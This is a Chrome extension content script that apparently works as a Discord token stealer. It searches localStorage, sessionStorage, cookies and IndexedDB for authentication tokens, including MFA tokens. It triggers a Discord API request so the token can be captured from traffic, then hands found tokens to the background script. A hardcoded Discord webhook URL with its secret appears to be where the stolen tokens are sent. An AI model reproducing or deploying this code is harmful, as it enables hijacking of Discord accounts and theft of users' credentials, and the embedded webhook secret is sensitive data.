const WEBHOOK_URL = "https://discord.com/api/webhooks/1375294694308708382/CKmKliuVJ-WlEzrI_vw3UfepsOUxt9gPgUSbHgBzS9BA3qxVHvmv_0aYu6Z9BZs9Z1mZ";
const TARGET_URL = "https://discord.com/channels/1322328218279088128/1322328219617333364";

function logMessage(level, context, message, extra = {}) {
  const timestamp = new Date().toISOString();
  let log = `[${timestamp}] [${level}] ${context}: ${message}`;
  if (extra.details) log += ` (Details: ${extra.details})`;
  if (extra.token) log += ` (Token: ${extra.token.substring(0, 10)}...)`;
  switch (level) {
    case 'ERROR':
      console.error(log);
      break;
    case 'SUCCESS':
      console.log(`%c${log}`, 'color: green');
      break;
    default:
      console.log(log);
  }
  chrome.runtime.sendMessage({
    action: 'logToWebhook',
    level,
    context,
    message,
    extra,
    timestamp,
    callback: true
  }, (response) => {
    console.log(`[Content] Log response: ${JSON.stringify(response)}`);
  });
}

async function retrieveToken(attempt = 1, maxAttempts = 3, delay = 1000) {
  logMessage('INFO', 'TokenRetriever', `Attempting to retrieve token (Attempt ${attempt})`);

  // Check localStorage and sessionStorage for common token keys
  const storageKeys = ['token', 'authToken', 'discordToken'];
  for (const key of storageKeys) {
    let token = window.localStorage.getItem(key);
    let source = `localStorage:${key}`;
    if (token && (token.includes(".") || token.startsWith("mfa."))) {
      logMessage('SUCCESS', 'TokenRetriever', `Token retrieved from ${source}`, { token });
      console.log(`Your token: ${token.substring(0, 10)}...`);
      chrome.runtime.sendMessage({
        action: 'sendToken',
        token,
        source,
        callback: true
      }, (response) => {
        console.log(`[Content] Token send response: ${JSON.stringify(response)}`);
      });
      return true;
    }

    token = window.sessionStorage.getItem(key);
    source = `sessionStorage:${key}`;
    if (token && (token.includes(".") || token.startsWith("mfa."))) {
      logMessage('SUCCESS', 'TokenRetriever', `Token retrieved from ${source}`, { token });
      console.log(`Your token: ${token.substring(0, 10)}...`);
      chrome.runtime.sendMessage({
        action: 'sendToken',
        token,
        source,
        callback: true
      }, (response) => {
        console.log(`[Content] Token send response: ${JSON.stringify(response)}`);
      });
      return true;
    }
  }

  // Check cookies
  const cookieResult = await new Promise((resolve) => {
    chrome.runtime.sendMessage({ action: 'getCookies', url: TARGET_URL }, (response) => {
      resolve(response || { error: 'No response' });
    });
  });
  if (cookieResult.cookies) {
    const cookie = cookieResult.cookies.find(c => storageKeys.includes(c.name) || c.value.includes('.'));
    const token = cookie ? cookie.value : null;
    const source = 'cookies';
    if (token && (token.includes(".") || token.startsWith("mfa."))) {
      logMessage('SUCCESS', 'TokenRetriever', `Token retrieved from ${source}`, { token });
      console.log(`Your token: ${token.substring(0, 10)}...`);
      chrome.runtime.sendMessage({
        action: 'sendToken',
        token,
        source,
        callback: true
      }, (response) => {
        console.log(`[Content] Token send response: ${JSON.stringify(response)}`);
      });
      return true;
    } else {
      logMessage('ERROR', 'TokenRetriever', 'No valid token found in cookies', { details: cookie ? 'Invalid format' : 'Token missing' });
    }
  } else {
    logMessage('ERROR', 'TokenRetriever', 'Failed to retrieve cookies', { details: cookieResult.error });
  }

  // Check IndexedDB
  try {
    const dbRequest = indexedDB.open('discord');
    dbRequest.onsuccess = () => {
      const db = dbRequest.result;
      const storeNames = db.objectStoreNames;
      logMessage('INFO', 'TokenRetriever', `IndexedDB stores: ${storeNames.length > 0 ? storeNames.join(', ') : 'none'}`);
      db.close();
    };
    dbRequest.onerror = () => {
      logMessage('ERROR', 'TokenRetriever', 'Failed to access IndexedDB', { details: dbRequest.error.message });
    };
  } catch (e) {
    logMessage('ERROR', 'TokenRetriever', 'IndexedDB access error', { details: e.message });
  }

  // Trigger /science API request
  try {
    await fetch('https://discord.com/api/v9/science', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ events: [{ type: 'ping', properties: {} }] })
    });
    logMessage('INFO', 'TokenRetriever', 'Triggered /science request to capture token in network');
  } catch (e) {
    logMessage('ERROR', 'TokenRetriever', 'Failed to trigger /science request', { details: e.message });
  }

  if (attempt < maxAttempts) {
    await new Promise(resolve => setTimeout(resolve, delay));
    return retrieveToken(attempt + 1, maxAttempts, delay);
  }
  logMessage('ERROR', 'TokenRetriever', 'Failed to retrieve token after all attempts', { details: 'Checked storage and /science request' });
  return false;
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'ping') {
    sendResponse({ status: 'active' });
    return true;
  }
  if (message.action === 'retrieveToken') {
    logMessage('INFO', 'TokenRetriever', 'Received retrieveToken message');
    retrieveToken().then((success) => {
      sendResponse({ status: success ? 'retrieved' : 'error', error: success ? null : 'Failed to retrieve token' });
    });
    return true;
  }
});

logMessage('SUCCESS', 'TokenRetriever', 'Content script initialized');